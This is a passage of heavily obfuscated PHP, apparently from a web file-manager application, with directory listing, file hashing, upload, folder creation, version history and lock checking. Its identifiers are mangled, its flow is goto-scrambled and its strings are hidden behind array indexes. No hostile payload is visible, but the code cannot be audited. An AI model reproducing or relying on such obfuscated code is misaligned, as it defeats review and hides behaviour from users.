$A…Ù±Ëƒ‹ = $this->iconvApp($this->pathThis($D¢°Ì÷Ø Ó)); if ($fŠä¬Î‘ÁÒ) { return array($fÁ°¨ÙÕšÔ[28] => $A…Ù±Ëƒ‹, $fÁ°¨ÙÕšÔ[75] => $this->getPathOuter($D¢°Ì÷Ø Ó), $fÁ°¨ÙÕšÔ[29] => $fÁ°¨ÙÕšÔ[164], $fÁ°¨ÙÕšÔ[77] => $this->size($D¢°Ì÷Ø Ó), $fÁ°¨ÙÕšÔ[157] => $this->ext($A…Ù±Ëƒ‹)); } $D§©‚éØ = array($fÁ°¨ÙÕšÔ[28] => $A…Ù±Ëƒ‹, $fÁ°¨ÙÕšÔ[75] => $this->getPathOuter($D¢°Ì÷Ø Ó), $fÁ°¨ÙÕšÔ[29] => $fÁ°¨ÙÕšÔ[164], $fÁ°¨ÙÕšÔ[184] => @filectime($D¢°Ì÷Ø Ó), $fÁ°¨ÙÕšÔ[107] => @filemtime($D¢°Ì÷Ø Ó), $fÁ°¨ÙÕšÔ[1153] => @fileatime($D¢°Ì÷Ø Ó), $fÁ°¨ÙÕšÔ[77] => $this->size($D¢°Ì÷Ø Ó), $fÁ°¨ÙÕšÔ[157] => $this->ext($A…Ù±Ëƒ‹), $fÁ°¨ÙÕšÔ[1147] => is_readable($D¢°Ì÷Ø Ó), $fÁ°¨ÙÕšÔ[1148] => is_writable($D¢°Ì÷Ø Ó), $fÁ°¨ÙÕšÔ[1154] => get_mode($D¢°Ì÷Ø Ó)); return $D§©‚éØ; } public function exist($B†¸œŞ±…Ï) { $B†¸œŞ±…Ï = $this->iconvSystem($B†¸œŞ±…Ï); return @file_exists($B†¸œŞ±…Ï); } public function isFile($a²Âç±ß) { $a²Âç±ß = $this->iconvSystem($a²Âç±ß); return @is_file($a²Âç±ß); } public function isFolder($c°öğ¬ÒÚî) { $c°öğ¬ÒÚî = $this->iconvSystem($c°öğ¬ÒÚî); return @is_dir($c°öğ¬ÒÚî); } public function listPath($D‡Á£ÎîÌ, $C‰Š«†‹ = false) { goto Dà”¥¶±ïË; aƒÌ†¢“ëç: $d°–§Ùì»± = array($F·îÈÚ”[74] => array(), $F·îÈÚ”[73] => array()); if (!($B–Ÿ†•¸’Ç = @opendir($D‡Á£ÎîÌ))) { return $d°–§Ùì»±; } while (($C–³ô³¯Ó¦ = readdir($B–Ÿ†•¸’Ç)) !== !1) { if ($C–³ô³¯Ó¦ == $F·îÈÚ”[93] || $C–³ô³¯Ó¦ == $F·îÈÚ”[1150]) { continue; } $B™ö¡¶’ = $D‡Á£ÎîÌ . $C–³ô³¯Ó¦; if (is_file($B™ö¡¶’)) { $d°–§Ùì»±[$F·îÈÚ”[73]][] = $this->fileInfo($B™ö¡¶’, $C‰Š«†‹); } else { $d°–§Ùì»±[$F·îÈÚ”[74]][] = $this->folderInfo($B™ö¡¶’, $C‰Š«†‹); } } goto a±®ˆŠÚµ; Dà”¥¶±ïË: $F·îÈÚ” =& $_SERVER[¼]; $D‡Á£ÎîÌ = $this->iconvSystem($D‡Á£ÎîÌ); $D‡Á£ÎîÌ = rtrim($D‡Á£ÎîÌ, $F·îÈÚ”[8]) . $F·îÈÚ”[8]; goto aƒÌ†¢“ëç; a±®ˆŠÚµ: closedir($B–Ÿ†•¸’Ç); return $d°–§Ùì»±; goto D½Øï÷‘£›; D½Øï÷‘£›: } public function listAll($e‹èòÚÖİÛ, &$c–Ä¬Šâô§ = array()) { goto aë–¬†‘«Û; aë–¬†‘«Û: $dØŠÕˆÃĞ =& $_SERVER[¼]; $e‹èòÚÖİÛ = $this->iconvSystem($e‹èòÚÖİÛ); $e‹èòÚÖİÛ = rtrim($e‹èòÚÖİÛ, $dØŠÕˆÃĞ[8]) . $dØŠÕˆÃĞ[8]; goto b·¨öïŒ¬ğ; E˜¸Ò¤³‘‹: return $c–Ä¬Šâô§; goto bŒğ…µê¶Í; b·¨öïŒ¬ğ: if (!($c¨¡•õ¿òÂ = @opendir($e‹èòÚÖİÛ))) { return $c–Ä¬Šâô§; } while (($bÔÙ¿„îÌï = readdir($c¨¡•õ¿òÂ)) !== !1) { if ($bÔÙ¿„îÌï == $dØŠÕˆÃĞ[93] || $bÔÙ¿„îÌï == $dØŠÕˆÃĞ[1150]) { continue; } $fö—Ô‹¢Ò = $e‹èòÚÖİÛ . $bÔÙ¿„îÌï; if (is_dir($fö—Ô‹¢Ò)) { $c–Ä¬Šâô§[] = array($dØŠÕˆÃĞ[75] => $fö—Ô‹¢Ò . $dØŠÕˆÃĞ[8], $dØŠÕˆÃĞ[76] => 1, $dØŠÕˆÃĞ[77] => 0); $this->listAll($fö—Ô‹¢Ò, $c–Ä¬Šâô§); } else { $c–Ä¬Šâô§[] = array($dØŠÕˆÃĞ[75] => $fö—Ô‹¢Ò, $dØŠÕˆÃĞ[76] => 0, $dØŠÕˆÃĞ[77] => $this->size($fö—Ô‹¢Ò)); } } closedir($c¨¡•õ¿òÂ); goto E˜¸Ò¤³‘‹; bŒğ…µê¶Í: } public function has($E…‚½ÆçŒ®, $C¹Îê²àêæ = false, $CŠ“»Õ¦î = true) { goto eÊÓ˜¿µÀ´; e„Çëµ«ĞÒ: return !1; goto cá¡‘”——; eõ°§®“éß: if (!($FàÛ«ˆ³¡Ã = @opendir($E…‚½ÆçŒ®))) { return !1; } $C¼™ÀÆàñ… = 0; $a¬ÃÛ²îŸÖ = 0; goto B¬ï½·›„›; B¬ï½·›„›: while (($c˜¾ö„Ñãå = readdir($FàÛ«ˆ³¡Ã)) !== !1) { if ($c˜¾ö„Ñãå == $f®×Èéç‰Å[93] || $c˜¾ö„Ñãå == $f®×Èéç‰Å[1150]) { continue; } $e·ß£°…–˜ = $E…‚½ÆçŒ® . $c˜¾ö„Ñãå; if ($C¹Îê²àêæ) { if (@is_file($e·ß£°…–˜)) { $C¼™ÀÆàñ…++; } else { $a¬ÃÛ²îŸÖ++; } continue; } if ($CŠ“»Õ¦î) { if (@is_file($e·ß£°…–˜)) { return !0; } } else { if (@is_dir($e·ß£°…–˜ . $f®×Èéç‰Å[8])) { return !0; } } } closedir($FàÛ«ˆ³¡Ã); if ($C¹Îê²àêæ) { return array($f®×Èéç‰Å[188] => $C¼™ÀÆàñ…, $f®×Èéç‰Å[189] => $a¬ÃÛ²îŸÖ); } goto e„Çëµ«ĞÒ; eÊÓ˜¿µÀ´: $f®×Èéç‰Å =& $_SERVER[¼]; $E…‚½ÆçŒ® = $this->iconvSystem($E…‚½ÆçŒ®); $E…‚½ÆçŒ® = rtrim($E…‚½ÆçŒ®, $f®×Èéç‰Å[8]) . $f®×Èéç‰Å[8]; goto eõ°§®“éß; cá¡‘”——: } public function hashSimple($Aä¦Â„—¦) { goto aÃÉ÷îŞˆ; a§Ùä–š‡: $BÉ‘ìŸ…®ˆ = $this->size($Aä¦Â„—¦); $CéÜà‰˜ŞÀ = 200; $c²ĞïöÑŒÒ = 50; goto CÏÒ•ÙÑ¨; Eˆ˜Ğ®ã: fseek($dğ³ŞšÒ, $BÉ‘ìŸ…®ˆ - $CéÜà‰˜ŞÀ); $cÂÓß®òÓ .= fread($dğ³ŞšÒ, $CéÜà‰˜ŞÀ); fclose($dğ³ŞšÒ); goto E÷ÚÍÙÚªß; F¸ª£‚°: $dğ³ŞšÒ = fopen($Aä¦Â„—¦, $eÚ½˜ˆÆÛ“[1155]); if (!$dğ³ŞšÒ) { return $cÂÓß®òÓ; } for ($b“İÌï÷¨á = 0; $b“İÌï÷¨á < $c²ĞïöÑŒÒ; $b“İÌï÷¨á++) { fseek($dğ³ŞšÒ, $eó´‘Ô‰—¼ * $b“İÌï÷¨á); $cÂÓß®òÓ .= fread($dğ³ŞšÒ, $CéÜà‰˜ŞÀ); } goto Eˆ˜Ğ®ã; E÷ÚÍÙÚªß: return md5($cÂÓß®òÓ) . $BÉ‘ìŸ…®ˆ; goto D¼— ³°œ; CÏÒ•ÙÑ¨: if ($BÉ‘ìŸ…®ˆ <= $CéÜà‰˜ŞÀ * $c²ĞïöÑŒÒ) { return $this->hashMd5($Aä¦Â„—¦) . $BÉ‘ìŸ…®ˆ; } $cÂÓß®òÓ = $eÚ½˜ˆÆÛ“[33]; $eó´‘Ô‰—¼ = intval($BÉ‘ìŸ…®ˆ / $c²ĞïöÑŒÒ); goto F¸ª£‚°; aÃÉ÷îŞˆ: $eÚ½˜ˆÆÛ“ =& $_SERVER[¼]; if (!$Aä¦Â„—¦) { return md5($eÚ½˜ˆÆÛ“[33]); } $Aä¦Â„—¦ = $this->iconvSystem($Aä¦Â„—¦); goto a§Ùä–š‡; D¼— ³°œ: } public function getContent($Càµ¼·Š…Ü) { $Càµ¼·Š…Ü = $this->iconvSystem($Càµ¼·Š…Ü); return file_get_contents($Càµ¼·Š…Ü); } public function setContent($b™•Í¯„æÂ, $A¹©Ñ‹•äé = '') { $b™•Í¯„æÂ = $this->iconvSystem($b™•Í¯„æÂ); @file_put_contents($b™•Í¯„æÂ, $A¹©Ñ‹•äé, LOCK_EX); clearstatcache(); return strlen($A¹©Ñ‹•äé) == filesize($b™•Í¯„æÂ); } public function fileSubstr($E³ÊùÅ—è”, $D£‡íŞ¤ªÓ = 0, $b³÷˜ÄŞÇ = false) { goto Bƒ¥İ‚À“®; aŒ¤—–«¥: return $e¶×’Ô•šå; goto EÕÈ³¡ùİ; DŠË’‡Ù…ä: if ($b³÷˜ÄŞÇ <= 0) { return $CÔí˜Ğ¹¹á[33]; } $eÅåÌ…Î¥ = fopen($E³ÊùÅ—è”, $CÔí˜Ğ¹¹á[1155]); if (!$eÅåÌ…Î¥) { return !1; } goto dãˆ¦ËÏ­; Bƒ¥İ‚À“®: $CÔí˜Ğ¹¹á =& $_SERVER[¼]; $E³ÊùÅ—è” = $this->iconvSystem($E³ÊùÅ—è”); if ($b³÷˜ÄŞÇ === !1) { $b³÷˜ÄŞÇ = $this->size($E³ÊùÅ—è”); } goto DŠË’‡Ù…ä; dãˆ¦ËÏ­: fseek($eÅåÌ…Î¥, $D£‡íŞ¤ªÓ); $e¶×’Ô•šå = fread($eÅåÌ…Î¥, $b³÷˜ÄŞÇ); fclose($eÅåÌ…Î¥); goto aŒ¤—–«¥; EÕÈ³¡ùİ: } public function upload($cà°ƒ×Ñ¨¬, $BÕÚŒ‘äé¶, $AÚå´“Ñà‡ = false, $E Ó±ÀÖô = REPEAT_REPLACE) { $c‹ŠÁó„ = $this->copyFile($BÕÚŒ‘äé¶, $cà°ƒ×Ñ¨¬); return $c‹ŠÁó„ ? $this->getPathOuter($cà°ƒ×Ñ¨¬) : !1; } public function download($dÎÍËó·›™, $E§ÆŠ†ºÊ™) { return $this->iconvSystem($dÎÍËó·›™); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($b£†ÚŒ»Õæ) { parent::__construct($b£†ÚŒ»Õæ); $this->signatureVersion($_SERVER[¼][197]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto cƒ‰äÙ–Ğ; FƒŸˆ÷¥ğÙ: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($eÎË«¦ÉÓ) { $b‘Ç¢ìÚô =& $_SERVER[¼]; $a¯Ì¥šéøè = Model($b‘Ç¢ìÚô[470])->where(array($b‘Ç¢ìÚô[1395] => $eÎË«¦ÉÓ))->find(); $D‚Í»Ú”ëî = $this->_mkdirRoot(SourceModel::TYPE_USER, $eÎË«¦ÉÓ, $a¯Ì¥šéøè[$b‘Ç¢ìÚô[28]]); $this->userDesktopAdd($D‚Í»Ú”ëî); return $D‚Í»Ú”ëî; } public function userDesktopAdd($EÉğ´èàŠ) { $aùÆ·ĞË» =& $_SERVER[¼]; $f¯ŠÅ÷Şˆ¬ = LNG($aùÆ·ĞË»[2282]); $fº­×÷ÜÚ¤ = $this->mkdir($EÉğ´èàŠ, $f¯ŠÅ÷Şˆ¬); $this->metaSet($fº­×÷ÜÚ¤, $aùÆ·ĞË»[2283], $aùÆ·ĞË»[83]); $this->metaSet($EÉğ´èàŠ, $aùÆ·ĞË»[2284], $fº­×÷ÜÚ¤); } public function groupRootAdd($bÆ‹È×ëÊ’) { $dÎ™¤À¦áç =& $_SERVER[¼]; $fÇêŠÛ«ëô = Model($dÎ™¤À¦áç[454])->where(array($dÎ™¤À¦áç[2139] => $bÆ‹È×ëÊ’))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $bÆ‹È×ëÊ’, $fÇêŠÛ«ëô[$dÎ™¤À¦áç[28]]); } public function systemRootPathAdd($DÄÅ´Í¨Šò) { if ($DÄÅ´Í¨Šò != $_SERVER[¼][1082]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $DÄÅ´Í¨Šò); } public function userRootRemove($Ağ†»—šÃ) { $DÓ¦•¬¼­‘ = $this->sourceRoot(SourceModel::TYPE_USER, $Ağ†»—šÃ); if (!$DÓ¦•¬¼­‘) { return; } $this->remove($DÓ¦•¬¼­‘, !1); } public function groupRootRemove($FØÇÜŒ‘´) { $eôÁîÓ‡ù– = $this->sourceRoot(SourceModel::TYPE_GROUP, $FØÇÜŒ‘´); if (!$eôÁîÓ‡ù–) { return; } $this->remove($eôÁîÓ‡ù–, !1); } private function _mkdirRoot($C·Ôñ·°ƒ, $bªë‹”‰, $D¾ëÛ„Ú) { goto Aç¯”â‰³; Aç¯”â‰³: $f°å¸ñâí =& $_SERVER[¼]; $cˆªĞ“ˆîÒ = array($f°å¸ñâí[365] => 0, $f°å¸ñâí[517] => $C·Ôñ·°ƒ, $f°å¸ñâí[518] => $bªë‹”‰, $f°å¸ñâí[514] => 1, $f°å¸ñâí[519] => USER_ID, $f°å¸ñâí[520] => USER_ID, $f°å¸ñâí[515] => $f°å¸ñâí[33], $f°å¸ñâí[521] => $f°å¸ñâí[466], $f°å¸ñâí[392] => 0, $f°å¸ñâí[516] => 0, $f°å¸ñâí[416] => 0, $f°å¸ñâí[522] => $f°å¸ñâí[33]); if ($Aõâğ‹· = $this->where($cˆªĞ“ˆîÒ)->find()) { return $Aõâğ‹·[$f°å¸ñâí[366]]; } goto f¢³Ï¼ô«í; f¢³Ï¼ô«í: $FÌ‘…¼²è¯ = "\115\x6f\144\145\x6c\123\157\165\162\x63\145\56\x6d\153\144\151\162\122\x6f\157\164\56{$C·Ôñ·°ƒ}\x2e{$bªë‹”‰}\56" . $D¾ëÛ„Ú; CacheLock::lock($FÌ‘…¼²è¯); $cˆªĞ“ˆîÒ[$f°å¸ñâí[28]] = $D¾ëÛ„Ú; goto d¹ÆÁÍ­İ; Díõœ­°ö‡: CacheLock::unlock($FÌ‘…¼²è¯); return $Cµ»ø´ÁÀŠ; goto DµçŠŒµ¢Ê; d¹ÆÁÍ­İ: $Cµ»ø´ÁÀŠ = $this->add($cˆªĞ“ˆîÒ); $dĞ²ÛïñÙ = array($f°å¸ñâí[523] => short_id($Cµ»ø´ÁÀŠ)); $this->where(array($f°å¸ñâí[380] => $Cµ»ø´ÁÀŠ))->save($dĞ²ÛïñÙ); goto Díõœ­°ö‡; DµçŠŒµ¢Ê: } private function sourceRoot($DŞôˆÔÆÛß, $dÂğ†¼”¼, $F¸âÇ¸Ïã = false) { $e’›ºÃßŒ =& $_SERVER[¼]; $c–¦Ñ¹î­ = array($e’›ºÃßŒ[365] => 0, $e’›ºÃßŒ[517] => $DŞôˆÔÆÛß, $e’›ºÃßŒ[518] => $dÂğ†¼”¼); if ($a¥«ŠÎŠŠ˜ = $this->where($c–¦Ñ¹î­)->find()) { return $F¸âÇ¸Ïã ? $a¥«ŠÎŠŠ˜ : $a¥«ŠÎŠŠ˜[$e’›ºÃßŒ[366]]; } return !1; } public function sourceRootGroup($A‡Ç‰Œ¯˜Ø) { $B¨÷ˆ¿ÆÎñ =& $_SERVER[¼]; if (is_string($A‡Ç‰Œ¯˜Ø)) { $A‡Ç‰Œ¯˜Ø = array($A‡Ç‰Œ¯˜Ø); } $côÕÚ¾»Ëù = array($B¨÷ˆ¿ÆÎñ[365] => 0, $B¨÷ˆ¿ÆÎñ[517] => SourceModel::TYPE_GROUP, $B¨÷ˆ¿ÆÎñ[518] => array($B¨÷ˆ¿ÆÎñ[7], $A‡Ç‰Œ¯˜Ø)); $A¼˜øÇãš = $this->listSource($côÕÚ¾»Ëù, 1000); return array_to_keyvalue($A¼˜øÇãš[$B¨÷ˆ¿ÆÎñ[74]], $B¨÷ˆ¿ÆÎñ[452]); } public function mkfile($D¬„ÄÌ¶¸Â, $eÎÕ°á§™ù, $d½ß‰ßî¡‡ = '', $D™œ‘Ã¯¬ğ = REPEAT_RENAME) { $Aºèõõ³ÂÌ =& $_SERVER[¼]; $B…œ­ê•ƒ¦ = Model($Aºèõõ³ÂÌ[540])->addFileByContent($d½ß‰ßî¡‡, $eÎÕ°á§™ù); return $this->_createFileCall($D¬„ÄÌ¶¸Â, $eÎÕ°á§™ù, $B…œ­ê•ƒ¦, $D™œ‘Ã¯¬ğ, $Aºèõõ³ÂÌ[1111]); } public function addFile($AÜƒÂà‘Ù, $fğîïóŒéÒ, $B÷°³Ì»ß, $D¡ö¦ØÇ…‚ = false, $D„ÖÓ§Ó‹† = REPEAT_RENAME) { $e¾çÒ ²™ = Model($_SERVER[¼][540])->addFile($fğîïóŒéÒ, $B÷°³Ì»ß, $D¡ö¦ØÇ…‚); return $this->_createFileCall($AÜƒÂà‘Ù, $B÷°³Ì»ß, $e¾çÒ ²™, $D„ÖÓ§Ó‹†); } public function addFileByFileID($a§¼¯ö£Äâ, $BôÅÎƒ±Ù¿, $D‹—Ù‚éµ, $bòÑÈÁÏ¨ = REPEAT_RENAME) { $a•éÓŸ¥Á• =& $_SERVER[¼]; $bªŞƒŞ¢òÔ = Model($a•éÓŸ¥Á•[540])->find($BôÅÎƒ±Ù¿); Model($a•éÓŸ¥Á•[540])->linkAdd($BôÅÎƒ±Ù¿); return $this->_createFileCall($a§¼¯ö£Äâ, $D‹—Ù‚éµ, $bªŞƒŞ¢òÔ, $bòÑÈÁÏ¨); } public function addFileByRemote($dÆ¥æÌí‹, $F¤¦óÑ¢Çš, $a„ÃµßÌ†ˆ, $aó¤Â¼Š‹ = array(), $E×²ñ¶Ñ¨ = REPEAT_RENAME) { $A¦³‡¤‡‹× = Model($_SERVER[¼][540])->addFileByRemote($F¤¦óÑ¢Çš, $a„ÃµßÌ†ˆ, $aó¤Â¼Š‹); return $this->_createFileCall($dÆ¥æÌí‹, $a„ÃµßÌ†ˆ, $A¦³‡¤‡‹×, $E×²ñ¶Ñ¨); } private function _createFileCall($DÀÊš‘ñ´à, $fÆ¦—»š¦, $F¾‚§ÓÂêÎ, $D÷µƒäÔí§, $Eô¶à½‰«Ø = "\165\x70\154\157\141\x64") { goto dØ²¦×•ƒÅ; Bæ£âÍœŒò: return $câˆ…šÚÑ¹; goto B´³ö„¹ŞØ; E‰Û¤ôô¢: $câˆ…šÚÑ¹ = $this->_createFile($DÀÊš‘ñ´à, $fÆ¦—»š¦, $F¾‚§ÓÂêÎ, $D÷µƒäÔí§, $Fš‚ª¢™º‹); if (!$Fš‚ª¢™º‹) { Model($eé±‰Ôˆ¯[418])->remove($F¾‚§ÓÂêÎ[$eé±‰Ôˆ¯[415]]); } else { if ($câˆ…šÚÑ¹) { Model($eé±‰Ôˆ¯[2254])->eventCreate($câˆ…šÚÑ¹, $Eô¶à½‰«Ø); } } $this->lockWriteEnd($DÀÊš‘ñ´à, $fÆ¦—»š¦); goto Bæ£âÍœŒò; dØ²¦×•ƒÅ: $eé±‰Ôˆ¯ =& $_SERVER[¼]; $Fš‚ª¢™º‹ = !1; $this->lockWriteStart($DÀÊš‘ñ´à, $fÆ¦—»š¦); goto E‰Û¤ôô¢; B´³ö„¹ŞØ: } public function mkdir($BææÜæì¦¤, $FêŸë—¤¡Š, $C ¿¤§±© = REPEAT_SKIP) { goto CŠßÄ… ğ; eëáÄßÂí: $dİ—”åïì = $this->_addSoure($AÆîˆ‰‚è‹, $f¯Å¦ãÆÅ½); Model($Dñ“±áÃ[2254])->eventCreate($dİ—”åïì, $Dñ“±áÃ[1112]); $this->lockWriteEnd($BææÜæì¦¤, $FêŸë—¤¡Š); goto B” »Òî‹; B” »Òî‹: return $dİ—”åïì; goto BôŠÖ¥¯Àã; Fªê«Ø…ô: $this->lockWriteStart($BææÜæì¦¤, $FêŸë—¤¡Š); if ($C ¿¤§±© !== !1) { $F½²à­âÂ = $this->fileNameExist($BææÜæì¦¤, $FêŸë—¤¡Š); if ($F½²à­âÂ && $C ¿¤§±© != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($BææÜæì¦¤, $FêŸë—¤¡Š); return $F½²à­âÂ; } $FêŸë—¤¡Š = $this->fileNameAuto($BææÜæì¦¤, $FêŸë—¤¡Š, $C ¿¤§±©); } $AÆîˆ‰‚è‹ = array($Dñ“±áÃ[514] => 1, $Dñ“±áÃ[383] => $FêŸë—¤¡Š, $Dñ“±áÃ[515] => $Dñ“±áÃ[33], $Dñ“±áÃ[416] => 0, $Dñ“±áÃ[516] => 0); goto eëáÄßÂí; CŠßÄ… ğ: $Dñ“±áÃ =& $_SERVER[¼]; $f¯Å¦ãÆÅ½ = $this->sourceInfo($BææÜæì¦¤); if (!$f¯Å¦ãÆÅ½) { return !1; } goto Fªê«Ø…ô; BôŠÖ¥¯Àã: } private function _createFile($FÈ£èÁ˜§ê, $eãÈÎ±®Ôä, $aÌù—Ø”Õğ, $D¦ˆÎ§‘›, &$d°¬£·‡Ğ½) { goto FÏ½Ü‚±­´; DÖò•ö‡¤: $Fƒ¶µ’“Ñ¦ = array($Eİ–¹ é„’[514] => 0, $Eİ–¹ é„’[383] => $eãÈÎ±®Ôä, $Eİ–¹ é„’[515] => get_path_ext($eãÈÎ±®Ôä), $Eİ–¹ é„’[416] => $aÌù—Ø”Õğ[$Eİ–¹ é„’[415]], $Eİ–¹ é„’[516] => $aÌù—Ø”Õğ[$Eİ–¹ é„’[77]]); $BË“Ö¿ Äî = $this->_addSoure($Fƒ¶µ’“Ñ¦, $D˜¢½³µÊö); $this->folderSizeReset($FÈ£èÁ˜§ê); goto e’ù´À±Á¥; e’ù´À±Á¥: return $BË“Ö¿ Äî; goto c¤×Ú«ÆŠ’; CÖÁšŒ†–à: if ($D¦ˆÎ§‘› !== !1) { $C…µÆ„±Ë = $this->fileNameExist($FÈ£èÁ˜§ê, $eãÈÎ±®Ôä); } $d°¬£·‡Ğ½ = !0; if ($D¦ˆÎ§‘› && $C…µÆ„±Ë) { if ($D¦ˆÎ§‘› == REPEAT_SKIP) { $d°¬£·‡Ğ½ = !1; return $C…µÆ„±Ë; } else { if ($D¦ˆÎ§‘› == REPEAT_REPLACE) { $cæ‚¹îÍ³¯ = $this->sourceInfo($C…µÆ„±Ë); $eñ·èÉ¥‰ = $this->fileHistory($cæ‚¹îÍ³¯, $aÌù—Ø”Õğ[$Eİ–¹ é„’[415]], $aÌù—Ø”Õğ[$Eİ–¹ é„’[77]]); if (!$eñ·èÉ¥‰) { $d°¬£·‡Ğ½ = !1; } else { $this->folderSizeReset($FÈ£èÁ˜§ê); } return $C…µÆ„±Ë; } else { $eãÈÎ±®Ôä = $this->fileNameAuto($FÈ£èÁ˜§ê, $eãÈÎ±®Ôä, $D¦ˆÎ§‘›, !1); } } } goto DÖò•ö‡¤; FÏ½Ü‚±­´: $Eİ–¹ é„’ =& $_SERVER[¼]; $D˜¢½³µÊö = $this->sourceInfo($FÈ£èÁ˜§ê); if (!$aÌù—Ø”Õğ || !$D˜¢½³µÊö) { return !1; } goto CÖÁšŒ†–à; c¤×Ú«ÆŠ’: } protected function fileHistory($fóùøÜñ„ê, $Cçš¦·ç·ó, $AÕÒŒ¬™Ø) { goto Aß´…ñ™Õ; båëÒ†Î™£: return !0; goto dË©ÒÌ…Äë; Aß´…ñ™Õ: $D´±Ì¨Œ‚ª =& $_SERVER[¼]; if ($fóùøÜñ„ê[$D´±Ì¨Œ‚ª[415]] == $Cçš¦·ç·ó) { return !1; } $this->checkLock($fóùøÜñ„ê[$D´±Ì¨Œ‚ª[366]], $Cçš¦·ç·ó); goto cÕİ˜ÓîÍ; cÕİ˜ÓîÍ: Model($D´±Ì¨Œ‚ª[2285])->addHistory($fóùøÜñ„ê); $FËœ¢¹©´ = array($D´±Ì¨Œ‚ª[520] => USER_ID, $D´±Ì¨Œ‚ª[387] => time(), $D´±Ì¨Œ‚ª[415] => $Cçš¦·ç·ó, $D´±Ì¨Œ‚ª[77] => $AÕÒŒ¬™Ø); $this->where(array($D´±Ì¨Œ‚ª[380] => $fóùøÜñ„ê[$D´±Ì¨Œ‚ª[366]]))->save($FËœ¢¹©´); goto båëÒ†Î™£; dË©ÒÌ…Äë: } public function checkLock($A³æ©²Ò‰ç, $Fæ„ÁéâÒñ) { goto d‡ùÓ¦¢ùÏ; f´òäèÙ‘»: show_json(LNG($B÷Œù†“Õ÷[2288]) . $B÷Œù†“Õ÷[2289] . LNG($B÷Œù†“Õ÷[2290]) . $B÷Œù†“Õ÷[2291] . $C¹ö×ÈÑÙ× . $B÷Œù†“Õ÷[2292], !1); goto C–Œë³ëŠ; d‡ùÓ¦¢ùÏ: $B÷Œù†“Õ÷ =& $_SERVER[¼]; $DÙƒ¾ÉÑêê = $this->pathInfo($A³æ©²Ò‰ç); if (!$this->fileIsLock($DÙƒ¾ÉÑêê, !0)) { return; } goto FÖÊ›Ş¥æô; e‘Õ™ó“‹ƒ: $this->_createFileCall($DÙƒ¾ÉÑêê[$B÷Œù†“Õ÷[457]], $EƒŸîòÉù, $f”ˆ³¤†İ, REPEAT_REPLACE, $B÷Œù†“Õ÷[1111]); $BÊÍÀ«„ = $DÙƒ¾ÉÑêê[$B÷Œù†“Õ÷[413]][$B÷Œù†“Õ÷[477]]; $C¹ö×ÈÑÙ× = $BÊÍÀ«„[$B÷Œù†“Õ÷[2287]] ? $BÊÍÀ«„[$B÷Œù†“Õ÷[2287]] : $BÊÍÀ«„[$B÷Œù†“Õ÷[28]]; goto f´òäèÙ‘»; FÖÊ›Ş¥æô: $DìÅ¸ù‰ù = Session::get($B÷Œù†“Õ÷[2286]); $EƒŸîòÉù = substr($DÙƒ¾ÉÑêê[$B÷Œù†“Õ÷[28]], 0, -1 - strlen($DÙƒ¾ÉÑêê[$B÷Œù†“Õ÷[157]])) . $B÷Œù†“Õ÷[1357] . $DìÅ¸ù‰ù . $B÷Œù†“Õ÷[93] . $DÙƒ¾ÉÑêê[$B÷Œù†“Õ÷[157]]; $f”ˆ³¤†İ = Model($B÷Œù†“Õ÷[540])->find($Fæ„ÁéâÒñ); goto e‘Õ™ó“‹ƒ; C–Œë³ëŠ: } public function fileIsLock($c„¨¼¢ÊÃ®, $FÒ‡éâ‘š¤ = false) { goto fÒ¯öÙ¾Î; b˜”­·àÉ—: return !1; goto EƒÉŞ¾ôô; fÒ¯öÙ¾Î: $dê·Ö»…Äø =& $_SERVER[¼]; if (!isset($c„¨¼¢ÊÃ®[$dê·Ö»…Äø[413]]) || !$c„¨¼¢ÊÃ®[$dê·Ö»…Äø[413]][$dê·Ö»…Äø[474]]) { return !1; } if ($c„¨¼¢ÊÃ®[$dê·Ö»…Äø[413]][$dê·Ö»…Äø[474]] != USER_ID) { return !0; } goto DÃÊ½âî‚¶; DÃÊ½âî‚¶: $dïÑ‘‹Êù = $GLOBALS[$dê·Ö»…Äø[6]][$dê·Ö»…Äø[84]][$dê·Ö»…Äø[475]]; if ($c„¨¼¢ÊÃ®[$dê·Ö»…Äø[413]][$dê·Ö»…Äø[476]] <= time() - $dïÑ‘‹Êù) { $this->metaSet($c„¨¼¢ÊÃ®[$dê·Ö»…Äø[366]], $dê·Ö»…Äø[474], null); $this->metaSet($c„¨¼¢ÊÃ®[$dê·Ö»…Äø[366]], $dê·Ö»…Äø[476], null); } if ($FÒ‡éâ‘š¤) { $this->metaSet($c„¨¼¢ÊÃ®[$dê·Ö»…Äø[366]], $dê·Ö»…Äø[476], time()); } goto b˜”­·àÉ—; EƒÉŞ¾ôô: } private function _addSoure($F–Î‡ê’§, $eÖË•µØí°) { goto cÏÏÕÄ™Ö; BŞ›—ª·ƒ„: static $B¼Ê©†¼©² = false; if (!$B¼Ê©†¼©²) { Hook::trigger($aÙø†ŠÕ²¯[504], $F–Î‡ê’§); $B¼Ê©†¼©² = !0; } $AÏ›¥ğÆ±Æ = $this->add($F–Î‡ê’§); goto B²˜î¸Ô¢İ; cÏÏÕÄ™Ö: $aÙø†ŠÕ²¯ =& $_SERVER[¼]; $fÍš‘Ñ•Œ‡ = array($aÙø†ŠÕ²¯[517] => $eÖË•µØí°[$aÙø†ŠÕ²¯[368]], $aÙø†ŠÕ²¯[518] => $eÖË•µØí°[$aÙø†ŠÕ²¯[452]], $aÙø†ŠÕ²¯[519] => USER_ID, $aÙø†ŠÕ²¯[520] => USER_ID, $aÙø†ŠÕ²¯[365] => $eÖË•µØí°[$aÙø†ŠÕ²¯[366]], $aÙø†ŠÕ²¯[521] => $eÖË•µØí°[$aÙø†ŠÕ²¯[455]] . $eÖË•µØí°[$aÙø†ŠÕ²¯[366]] . $aÙø†ŠÕ²¯[47], $aÙø†ŠÕ²¯[392] => 0, $aÙø†ŠÕ²¯[522] => $aÙø†ŠÕ²¯[33]); $F–Î‡ê’§ = array_merge($fÍš‘Ñ•Œ‡, $F–Î‡ê’§); goto BãİÊÄ¿ôô; BãİÊÄ¿ôô: $this->updateModifyTime($F–Î‡ê’§[$aÙø†ŠÕ²¯[457]]); $FÉ¹°Ñğ‡­ = $aÙø†ŠÕ²¯[2293] . $eÖË•µØí°[$aÙø†ŠÕ²¯[366]]; if 